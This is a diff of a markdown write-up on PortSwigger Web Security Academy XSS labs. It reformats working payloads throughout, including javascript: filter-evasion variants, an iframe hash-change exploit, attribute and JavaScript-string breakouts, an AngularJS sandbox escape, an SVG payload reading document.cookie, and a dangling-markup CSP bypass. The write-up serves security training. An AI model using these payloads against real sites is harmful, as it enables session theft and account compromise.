@@ -44,10 +44,11 @@ From a pentester’s view, the real issue is **missing protocol allowlisting**.
 
 Simple keyword blocking is unreliable, so variants should always be tested:
 
-- `JaVaScRiPt:alert(1)`
+- ```JaVaScRiPt:alert(1)```
 
-- `javascript:alert(1)`
-- `&#106;avascript:alert(1)`
+- ```javascript:alert(1)```
+
+- ```&#106;avascript:alert(1)```
 
 ## Real-world application
 
@@ -72,7 +73,7 @@ The input from `location.hash` ends up inside a **jQuery selector**, which becom
 
 <img width="1153" height="581" alt="Captura de pantalla 2026-01-16 213425" src="https://github.com/user-attachments/assets/1c0c97c9-b0c9-42e4-b616-704a6e476c61" />
 
-`<iframe src="https://0af8007f0309c28b80ce6cfc000d0084.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
+```<iframe src="https://0af8007f0309c28b80ce6cfc000d0084.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
 
 I used an `<iframe>` to load the page first and **then force a hash change**, which triggers the event and executes the payload automatically, without user interaction.
 
@@ -92,17 +93,17 @@ _________________
     
 - The first step is to understand the attribute structure returned by the server:
 
-`<input type="text" placeholder="Search the blog..." name="search" value="example">`
+```<input type="text" placeholder="Search the blog..." name="search" value="example">```
 
 - To exploit this, the goal is to **close the `value` attribute** and inject a new one.
 
 **Payload:**
 
-`" onmouseover="alert(1)`
+```" onmouseover="alert(1)```
 
 - The server adds the final quote, resulting in a valid event handler:
 
-`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`
+```<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">```
 
 - This lab reinforces that the **server encodes**, but the **browser decodes** automatically when rendering HTML.
 
@@ -152,12 +153,12 @@ This lab has **three clear constraints** from the start:
 - The input is reflected inside a **JavaScript string** (search parameter)
 ### Payload
 
-`'-alert(1)-'`
-### What is actually happening
+```'-alert(1)-'```
+#### What is actually happening
 
 User input ends up inside a JavaScript string:
 
-`searchTerms = 'hello'; document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');`
+```searchTerms = 'hello'; document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');```
 
 By injecting `'-alert(1)-'`:
 
@@ -237,11 +238,11 @@ In AngularJS, the attack does not aim to break HTML, but rather to **hijack the 
 
 The key trick is that this payload travels as **dead text** from the browser’s perspective, but becomes a **legitimate executable instruction** once it passes through Angular’s compilation “toll gate,” bypassing any traditional HTML-based filtering.
 
-`{{$on.constructor('alert(1)')()}}`
+```{{$on.constructor('alert(1)')()}}```
 
 To identify this vulnerability without triggering alarms, the analysis focuses on the **Scope exposure surface**. First, we locate interpolation points `{{ }}` where user-controlled data is reflected. Then, using the browser console, we audit Angular’s memory “bubble” with:
 
-`angular.element(document.body).scope()`
+```angular.element(document.body).scope()```
 
 If this inspection reveals active functions such as `$on` or `$watch`, we verify whether their `.constructor` points to the global `Function` constructor. This linkage is the **“master key”**: if it exists and the input is not properly sanitized, the environment is vulnerable by design.
 
@@ -280,14 +281,14 @@ This lab first forces us to understand **what SVG is and how it works**, but mor
 
 - **Normal SVG**
 
-`<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">   <!-- SVG content here --> </svg>`
+```<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">   <!-- SVG content here --> </svg>```
 
 - **`xmlns`**: Defines the XML namespace for SVG.  
     For **SVG**, this attribute is **mandatory** — it must never be removed. Without it, the SVG will not work under any circumstances, and its value is always the same.
 
 - **Malicious SVG**
 
-`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">   <rect width="100" height="100" fill="blue" /> </svg>`
+```<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">   <rect width="100" height="100" fill="blue" /> </svg>```
 
 Another fundamental concept for us as pentesters is understanding the **two core components of SVG**.
 ## Event Handlers
@@ -296,7 +297,7 @@ Another fundamental concept for us as pentesters is understanding the **two core
 
 **Example of SVG event handlers:**
 
-`<svg xmlns="http://www.w3.org/2000/svg">   <rect onclick="alert('XSS!')" width="100" height="100" fill="green" /> </svg>`
+```<svg xmlns="http://www.w3.org/2000/svg">   <rect onclick="alert('XSS!')" width="100" height="100" fill="green" /> </svg>```
 
 Here, clicking on the green rectangle triggers the JavaScript code.
 ### SVG Markup / Tags
@@ -304,7 +305,7 @@ Here, clicking on the green rectangle triggers the JavaScript code.
 - Tags provide the **execution surface**. Most attacks start with `<svg>`, which opens the root SVG element. When HTML encounters `<svg>`, it interprets it as a **two-dimensional vector graphic**, which in pentester terms becomes **our first Trojan horse**.
 
 
-`Each element, attribute, and style in an SVG file is defined by markup following W3C specifications. Unlike raster image formats (PNG or JPG), SVG markup is human-readable and editable as text, allowing manipulation through developer tools, scripts, and CSS.`
+```Each element, attribute, and style in an SVG file is defined by markup following W3C specifications. Unlike raster image formats (PNG or JPG), SVG markup is human-readable and editable as text, allowing manipulation through developer tools, scripts, and CSS.```
 
 - **Graphic elements**: `<circle>`, `<rect>`, `<path>`, etc.
 - **Attributes**: `width`, `height`, `fill`, `stroke`, etc.
@@ -342,7 +343,7 @@ With these concepts in place, we can understand the solution. The lab title says
 
 - After running the attack, we identify which payloads return **HTTP 200**. These are the tags **not filtered by the WAF**:
 
-`animatetransform image svg title`
+```animatetransform image svg title```
 
 ### Event Injection
 
@@ -416,7 +417,7 @@ The application allows users to update their email address. After submitting the
 **Dangling Markup** is a data exfiltration technique used when JavaScript execution is blocked by CSP. Instead of executing code, we inject **open tags or form-related attributes** to capture whatever comes next in the HTML.
 
 **Test payload (PoC):**  
-`test@test.com"><button formaction="https://google.com">STEAL</button>`
+```test@test.com"><button formaction="https://google.com">STEAL</button>```
 
 If clicking the button redirects to Google, the issue is confirmed. I used **GET** here because it’s easier to observe in the URL and usually less restricted than complex POST requests.
 ### Final Exploit
@@ -515,7 +516,7 @@ if (csrf) {
 </script>
 </body>
 
-```
+
 ## Real-World Application
 
 1. **CSP blind spots:** Blocking JavaScript alone is not enough. If structural HTML injection is possible, **Dangling Markup** can completely bypass a strict CSP.
@@ -531,7 +532,7 @@ _____________________________
 - This exercise requires a deep understanding of **CSP directives**, how they work, and more importantly, how they can be manipulated. We start by testing a very simple payload:
     
 
-`<img src=' onerror=alert()>`
+```<img src=' onerror=alert()>```
 
 After sending this payload, we inspect the page behavior using the browser developer tools. Something very important and interesting appears in this lab: the **`?token=`** parameter.
 
